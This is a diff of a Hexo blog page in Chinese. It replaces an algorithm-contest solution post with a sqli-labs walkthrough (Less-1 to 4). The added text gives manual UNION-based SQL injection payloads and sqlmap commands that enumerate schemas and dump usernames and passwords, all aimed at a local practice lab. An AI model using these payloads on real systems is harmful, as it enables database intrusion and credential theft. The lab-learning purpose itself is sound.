@@ -10,7 +10,7 @@
 		
 
 <head><meta name="generator" content="Hexo 3.8.0">
-	<title>蓝桥杯刷题——数字游戏</title>
+	<title>miraitowa</title>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="apple-mobile-web-app-title" content="Amaze UI">
@@ -55,7 +55,7 @@
 		
 		
 			
-			<p class="page-name">当前文章&nbsp;:&nbsp;《蓝桥杯刷题——数字游戏》</p>
+			<p class="page-name">当前文章&nbsp;:&nbsp;《》</p>
 			
 		
 	
@@ -160,20 +160,14 @@
 				<h1 class="am-article-title blog-text-center">
 					
 					
-	
-		<a href="/2018/12/07/蓝桥杯刷题——数字游戏/" itemprop="url">		
-			蓝桥杯刷题——数字游戏		
-		</a>
-	
-
 				</h1>
 
 				<p class="am-article-meta blog-text-center">
 					<span>
 						<i class="fa fa-clock-o"></i> 
-						<a href="/2018/12/07/蓝桥杯刷题——数字游戏/" itemprop="url">
-	<time datetime="2018-12-07T10:06:16.845Z" itemprop="datePublished">
-  		2018-12-07
+						<a href="/2018/12/25/sqlmap看sqli-labs学习篇(一)/" itemprop="url">
+	<time datetime="2018-12-25T01:38:11.307Z" itemprop="datePublished">
+  		2018-12-25
   </time>
 </a>    
 &nbsp;
@@ -188,81 +182,90 @@
 			<div class="am-article-bd">
 				<div class="content" id="post-content">
 					
-						<h2 id="蓝桥杯刷题——数字游戏"><a href="#蓝桥杯刷题——数字游戏" class="headerlink" title="蓝桥杯刷题——数字游戏"></a>蓝桥杯刷题——数字游戏</h2><h3 id="问题-1443-蓝桥杯-历届试题-数字游戏"><a href="#问题-1443-蓝桥杯-历届试题-数字游戏" class="headerlink" title="问题 1443: [蓝桥杯][历届试题]数字游戏"></a>问题 1443: [蓝桥杯][历届试题]数字游戏</h3><p><strong>题目描述</strong></p>
-<p>栋栋正在和同学们玩一个数字游戏。 </p>
-<p>游戏的规则是这样的：栋栋和同学们一共n个人围坐在一圈。栋栋首先说出数字1。接下来，坐在栋栋左手边的同学要说下一个数字2。</p>
-<p>再下面的一个同学要从上一个同学说的数字往下数两个数说出来，也就是说4。下一个同学要往下数三个数，说7。依次类推。 </p>
-<p>为了使数字不至于太大，栋栋和同学们约定，当在心中数到  k-1  时，下一个数字从0开始数。例如，当k=13时，</p>
-<p>栋栋和同学们报出的前几个数依次为： </p>
-<pre><code>1,  2,  4,  7,  11,  3,  9,  3,  11,  7。 
-</code></pre><p>游戏进行了一会儿，栋栋想知道，到目前为止，他所有说出的数字的总和是多少。 </p>
-<p><strong>样例说明</strong></p>
-<p>栋栋说出的数依次为1,7,9和为17。数据规模和约定<code>1&lt;n,k,T&lt;1,000,000；</code> </p>
-<p><strong>输入</strong></p>
-<p>输入的第一行包含三个整数  n,k,T，其中  n  和  k  的意义如上面所述，T  表示到目前为止栋栋一共说出的数字个数。 </p>
-<p><strong>输出</strong></p>
-<p>输出一行，包含一个整数，表示栋栋说出所有数的和。 </p>
-<p><strong>样例输入</strong></p>
-<p>3  13  3 </p>
-<p><strong>样例输出</strong></p>
-<p>17</p>
-<h4 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h4><p>题目中所给样例过于简单，换做测试数据第一组。</p>
-<p> n=5,k=13,t=41;</p>
-<p>第零次栋栋所报数字均为1。</p>
-<p>要计算第一次栋栋所报数字，就要先算出其余人所报数字之和。再加上栋栋第一次所报数字即为要报数字。具体为:</p>
-<p>1+(1+2+3+4+5)=16</p>
-<p>第二次：16+(6+7+8+9+10)=56</p>
-<p>第三次：56+(11+12+13+14+15)=?</p>
-<p>第x次：s[x-1]+((x-1)<em>n+1+x</em>n)*n/2=?</p>
-<p>(x-1)*n+1为后面等差数列的第一个数</p>
-<p>(x*n)为后面等差数列的最后一个数</p>
-<p>再运用等差数列求和公式即可得到结果。</p>
-<p>还要注意一个细节：n，k，l也要定义成LL！</p>
-<p><strong>代码</strong></p>
-<pre><code>#include&lt;bits/stdc++.h&gt;
-using namespace std;
-int main()
-{
-    long long n,k,t;
-    while(cin&gt;&gt;n&gt;&gt;k&gt;&gt;t)
-    {
-        long long sum=1,x=1,y=1;
-        for(int i=1;i&lt;t;i++)
-        {
-            sum+=((i-1)*n+1+i*n)*n/2;
-            sum%=k;
-            y+=sum;            
-        }
-        cout&lt;&lt;y&lt;&lt;endl;
-    }
-    return 0;
-}
-</code></pre><p><strong>另一种代码</strong></p>
-<p>观察样例，栋栋先说1，然后下一个同学就是1+1，接下来是1+1+2，然后又是栋栋说1+1+2+3^依此下去是1+1+2+3+4……</p>
-<p>因此栋栋每次报的数都是1+(1+n)*n/2。可以把要加的数每n个分成一份，不断更新l,r，加到上一次报的数上去，如果大于了k-1，</p>
-<p>就要对k取余(因为当报的数是k-1的下一个时，要从0开始)。还有一个坑，就是注意所有的数都要是long long类型的来定义，否则会错。</p>
-<pre><code>#include&lt;bits/stdc++.h&gt;
-using namespace std;
-int main()
-{
-long long n,k,t;
-while(~scanf(&quot;%lld%lld%lld&quot;,&amp;n,&amp;k,&amp;t))
-{
-long long x=1,ans=1;
-long long l=1,r=n;
-for(int i=1; i&lt;t; i++)
-{
-x+=(l+r)*n/2;
-x=x%k;
-ans+=x;
-l=1+i*n;
-r=n+i*n;
-}
-printf(&quot;%lld\n&quot;,ans);
-}
-return 0;
-}
-</code></pre>
+						<hr>
+<p>title: sqlmap看sqli-labs学习篇(一)<br>data: 2018-12-25<br>categories: </p>
+<pre><code>- SQLmap
+</code></pre><hr>
+<p>很早之前的文章，忘记搬过来了，<a href="https://www.cnblogs.com/miraitowa/p/9363151.html" target="_blank" rel="noopener">https://www.cnblogs.com/miraitowa/p/9363151.html</a></p>
+<p>刚刚做完sqli-labs的第一节的第一题（QAQ）</p>
+<p>我的时间呀！！！（太笨只能一步一步的往前走）</p>
+<p>我使用了两种方法解决的这一题，希望能够帮助到你们</p>
+<h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><p>题目是 ：<strong>GET Error based- Single quotes -String</strong></p>
+<p>解题链接：<code>http://127.0.0.1/sqli-labs-master/Less-1/</code></p>
+<p>关注点：基于错误，单引号，字符型注入。</p>
+<p>手工注入：</p>
+<pre><code>payload1:http://127.0.0.1/sqli-labs-master/Less-1/?id=0
+</code></pre><p>页面正常：</p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724203641378-632213449.png" alt=""></p>
+<pre><code>payload2:http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39;
+</code></pre><p>页面返回错误（可以判断有字符型的注入）</p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724203829757-1396637513.png" alt=""></p>
+<p>使用<code>UNION SELECT</code>或者 <code>ORDER BY</code> 语句进行查询字段数：</p>
+<pre><code>payload3：http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; UNION SELECT 1,2,3 --+
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724204917779-393714360.png" alt=""></p>
+<p>可以发现字段数为 3 ，可显示位置为 2,3。尾部—+会被浏览器解释为— （空格），这在mysql里是注释。</p>
+<p>然后就可以查询数据库的名称</p>
+<pre><code>payload4：http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+
+</code></pre><p> <img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724205113119-998813727.png" alt=""></p>
+<p>这里是利用元数据表INFORMATION_SCHEMA获取数据库信息。</p>
+<p>获取表名：</p>
+<pre><code>payload5：http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724205621262-1767552490.png" alt=""></p>
+<p>这里<code>hex(security)=0x7365637572697479</code>（进行十六进制的转换）</p>
+<p> <img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724205737352-1892670947.png" alt=""></p>
+<p> 获取字段名：</p>
+<pre><code>payload6:http://127.0.0.1/sqli-labs-master/Less-1/?id=0%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
+</code></pre><p> <img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724205932149-179428232.png" alt=""></p>
+<p>最后就是进行数据的查询：</p>
+<pre><code>payload7：http://127.0.0.1/sqli-labs-master/Less-1/?id=0%27%20union%20select%201,group_concat(username,0x3a,password,0x20),3%20from%20security.users%20--+
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724210025184-1653728106.png" alt=""></p>
+<p>sqlmap工具注入：</p>
+<p>首先进行数据的查询：</p>
+<pre><code>payload1:python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=0&quot; --technique UE --dbms mysql --dbs --batch
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724210407249-580726859.png" alt=""></p>
+<p> 数据库中的表的查询：</p>
+<pre><code>payload2：python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=0&quot; --technique UE --dbms mysql -D security --tables --batch
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724210407249-580726859.png" alt=""></p>
+<p>字段信息的查询：</p>
+<pre><code>payload3：python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=0&quot; --technique UE --dbms mysql -D security -T users --columns --batch
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724210657678-242523110.png" alt=""></p>
+<p>最后就会得到具体的答案了：</p>
+<pre><code>payload4;python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=0&quot; --technique UE --dbms mysql -D security -T users -C username,password --dump --batch
+</code></pre><p> <img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724210813663-252433804.png" alt=""></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724210831866-2097087268.png" alt=""></p>
+<h4 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/
+</code></pre><p>由于题目说是数值型注入。 所以不需要闭合引号。</p>
+<p>其它的过程和第一题一样的：</p>
+<p>直接给出最后的<code>payload：http://127.0.0.1/sqli-labs-master/Less-2/?id=0%20UNION%20SELECT%201,GROUP_CONCAT(username,0x3a,password,0x20),3%20FROM%20security.users%20--+</code></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724213047826-1986597676.png" alt=""></p>
+<p> 使用sqlmap注入：<code>python sqlmap.py -u &quot;127.0.0.1/sqli-labs-master/Less-2/?id=0 &quot; --technique UE --dbms mysql -D security -T users -C username,password --dump --batch</code></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724213155205-601119244.png" alt=""></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724213210283-1934635524.png" alt=""></p>
+<h4 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-3/
+</code></pre><p>首先：进行一下手工注入：</p>
+<pre><code>payload：http://127.0.0.1/sqli-labs-master/Less-3/?id=1%27
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724222151326-1972584973.png" alt=""></p>
+<p>注意到报错回显中有 )，说明需要闭合。</p>
+<p>我们只是需要把第一题中的每一个（0‘——&gt;0’）)就好了</p>
+<p>手工注入：</p>
+<pre><code>payload：127.0.0.1/sqli-labs-master/Less-3/?id=0&#39;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180724222503066-492077415.png" alt=""></p>
+<p> sqlmap注入：<code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-3/?id=1=0&#39;)&quot; --technique UE --dbms mysql -D security -T users -C password,username --dump --batch</code></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180726152104883-2084351698.png" alt=""></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180726152129351-915689585.png" alt=""></p>
+<h4 id="第四题："><a href="#第四题：" class="headerlink" title="第四题："></a>第四题：</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-4/
+</code></pre><p>首先：进行手工注入：<code>http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</code></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180726152610472-859450093.png" alt=""></p>
+<p>ennnnnnnn………………….</p>
+<p>我们只是需要把双引号后面加上一个）就可以了</p>
+<p>接下来手工注入的方式和以上相同</p>
+<pre><code>payload：http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;)  union select 1,group_concat(char(32),username,char(23)),group_concat(char(32),password,char(32)) from users--+
+</code></pre><p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180726153009128-1233228787.png" alt=""></p>
+<p> 使用sqlmap注入：</p>
+<p>我直接写出最后要运行的：<code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;)&quot; --technique UE --dbms mysql -D security -T users -C password,username --dump --batch</code></p>
+<p> <img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180726153130652-2958884.png" alt=""></p>
+<p><img src="https://images2018.cnblogs.com/blog/1335842/201807/1335842-20180726153146729-1258649222.png" alt=""></p>
+
 					
 				</div>
 			</div>
@@ -270,15 +273,9 @@ return 0;
 
 		<ul class="am-pagination">
     
-    	<li class="am-pagination-prev">
-   		<a class="pull-left" href="/2018/12/07/蓝桥杯刷题——母牛的故事/" title="蓝桥杯刷题——母牛的故事">
-      		&laquo; 上一篇
-		</a>
-		</li>
-	
 	
 		<li class="am-pagination-next">
-		<a class="pull-right" href="/2018/12/05/蓝桥杯刷题——拼接平方数/" title="蓝桥杯刷题——拼接平方数">
+		<a class="pull-right" href="/2018/12/23/数据结构——树与二叉树学习篇(一)/" title="数据结构——树与二叉树学习篇(一)">
 			下一篇 &raquo;
 		</a>
 		</li>
@@ -407,7 +404,7 @@ return 0;
 				
 				
 				<!--toc(post.content)-->
-				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#蓝桥杯刷题——数字游戏"><span class="post-toc-text">蓝桥杯刷题——数字游戏</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#问题-1443-蓝桥杯-历届试题-数字游戏"><span class="post-toc-text">问题 1443: [蓝桥杯][历届试题]数字游戏</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解析"><span class="post-toc-text">题目解析</span></a></li></ol></li></ol></li></ol>
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#第一题"><span class="post-toc-text">第一题</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#第二题："><span class="post-toc-text">第二题：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#第三题："><span class="post-toc-text">第三题：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#第四题："><span class="post-toc-text">第四题：</span></a></li></ol>
 			</nav>
 			<div class="post-toc-bar"><div>
 		</div></div></aside>
